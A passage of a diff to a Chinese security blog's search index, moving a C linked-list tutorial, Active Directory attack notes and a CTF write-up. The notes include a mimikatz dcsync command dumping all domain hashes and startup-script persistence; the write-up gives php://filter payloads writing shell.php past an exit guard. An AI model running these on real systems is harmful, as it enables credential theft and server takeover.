@@ -174,6 +174,29 @@
       </tags>
   </entry>
   <entry>
+    <title>链表-c语言</title>
+    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
+<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
+<span id="more"></span>
+
+<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多谢刘**的指导（内心抗拒）</p>
+<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>算法与数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2021总结</title>
     <url>/2022/01/11/2021%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><ul>
@@ -209,6 +232,72 @@
       </categories>
       <tags>
         <tag>对2021年总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AD域的攻击方式</title>
+    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
+<p>win+R键打开运行，输入“gpedit.msc”</p>
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
+<p>添加对应脚本即可</p>
+<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
+<p>通常用来权限维持</p>
+<span id="more"></span>
+
+<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
+<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
+<p>目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
+<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
+<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
+<p>Gpp 用来在下面场景存储和使用凭据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
+<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得以下任一用户的权限：</span><br><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>AD域的攻击方式</tag>
       </tags>
   </entry>
   <entry>
@@ -297,72 +386,6 @@
       </categories>
       <tags>
         <tag>DASCTF July X CBCTF 4th</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AD域的攻击方式</title>
-    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
-<p>win+R键打开运行，输入“gpedit.msc”</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
-<p>添加对应脚本即可</p>
-<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
-<p>通常用来权限维持</p>
-<span id="more"></span>
-
-<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
-<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
-<p>目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
-<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
-<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
-<p>Gpp 用来在下面场景存储和使用凭据</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
-<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
-<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得以下任一用户的权限：</span><br><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>AD域的攻击方式</tag>
       </tags>
   </entry>
   <entry>
@@ -735,6 +758,42 @@
       </tags>
   </entry>
   <entry>
+    <title>file_put_content利用(php://filter协议)</title>
+    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<hr>
+<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
+<span id="more"></span>
+
+<blockquote>
+<p>Payload:     </p>
+<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
+<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
+</blockquote>
+<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
+<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
+<blockquote>
+<p>Payload: </p>
+<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
+</blockquote>
+<hr>
+<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>file_put_content</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>log4j2远程代码执行漏洞</title>
     <url>/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）"><a href="#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）" class="headerlink" title="Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）"></a>Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就<code>Java的日志记录工具</code>。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
@@ -811,42 +870,6 @@
       </categories>
       <tags>
         <tag>log4j2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>file_put_content利用(php://filter协议)</title>
-    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<hr>
-<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
-<span id="more"></span>
-
-<blockquote>
-<p>Payload:     </p>
-<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
-<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
-</blockquote>
-<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
-<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
-<blockquote>
-<p>Payload: </p>
-<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
-</blockquote>
-<hr>
-<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>file_put_content</tag>
       </tags>
   </entry>
   <entry>
@@ -930,29 +953,6 @@
       </categories>
       <tags>
         <tag>MRCTF2021</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>链表-c语言</title>
-    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
-<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
-<span id="more"></span>
-
-<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    